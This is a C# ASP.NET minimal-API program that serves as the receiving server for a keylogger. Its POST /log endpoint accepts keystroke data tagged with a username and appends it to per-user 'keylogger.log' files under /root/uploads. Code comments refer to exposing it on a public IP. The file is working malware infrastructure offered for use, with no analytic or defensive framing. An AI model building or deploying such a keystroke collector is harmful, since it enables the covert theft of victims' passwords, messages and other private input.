using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.AspNetCore.Http;
using System.IO;
using System.Threading.Tasks;

using System.Collections.Concurrent;
using System.Threading;
using System.Runtime.InteropServices;

var builder = WebApplication.CreateBuilder(args);

builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

var app = builder.Build();

// Semaphore dictionary to handle concurrent writes per user
var locks = new ConcurrentDictionary<string, SemaphoreSlim>();

// Always enable Swagger for this analysis/debug phase, 
// or you can keep it as is if you prefer it only in Development.
// Since you want to access it from public IP, usually it's better to control it via environment.
app.UseSwagger();
app.UseSwaggerUI();

app.UseRouting();

// Update this route to receive the keystrokes correctly
app.MapPost("/log", async (HttpRequest request) =>
{
    var username = request.Query["username"].ToString();
    Console.WriteLine($"[DEBUG_LOG] Received log request for username: '{username}'");

    if (string.IsNullOrWhiteSpace(username))
    {
        Console.WriteLine("[DEBUG_LOG] Error: Username is required.");
        return Results.BadRequest("Username is required.");
    }

    using var reader = new StreamReader(request.Body);
    var content = await reader.ReadToEndAsync();

    if (string.IsNullOrEmpty(content))
    {
        Console.WriteLine("[DEBUG_LOG] Error: No content received.");
        return Results.BadRequest("No content.");
    }

    // Sanitize username to prevent directory traversal
    var safeUsername = Path.GetFileName(username);
    Console.WriteLine($"[DEBUG_LOG] Safe username: '{safeUsername}'");

    // Detect if we are running on Windows or Linux to set the base path accordingly
    var isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
    var baseUploadPath = isWindows ? "C:\\root\\uploads" : "/root/uploads";
    
    var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
    try 
    {
        if (!Directory.Exists(userUploadPath))
        {
            Console.WriteLine($"[DEBUG_LOG] Creating directory: {userUploadPath}");
            Directory.CreateDirectory(userUploadPath);
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[DEBUG_LOG] Failed to create directory {userUploadPath}: {ex.Message}");
        return Results.Problem("Failed to create directory.");
    }
 
    var filePath = Path.Combine(userUploadPath, "keylogger.log");

    // Get or create a semaphore for this specific user's log file
    var userLock = locks.GetOrAdd(safeUsername, _ => new SemaphoreSlim(1, 1));
    await userLock.WaitAsync();
    try
    {
        // Append the keystrokes to the file
        Console.WriteLine($"[DEBUG_LOG] Appending content to {filePath}");
        await File.AppendAllTextAsync(filePath, content);
        Console.WriteLine($"[DEBUG_LOG] Successfully wrote to {filePath}");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[DEBUG_LOG] Failed to write to file {filePath}: {ex.Message}");
        return Results.Problem("Failed to write to file.");
    }
    finally
    {
        userLock.Release();
    }

    return Results.Ok();
});

app.Run();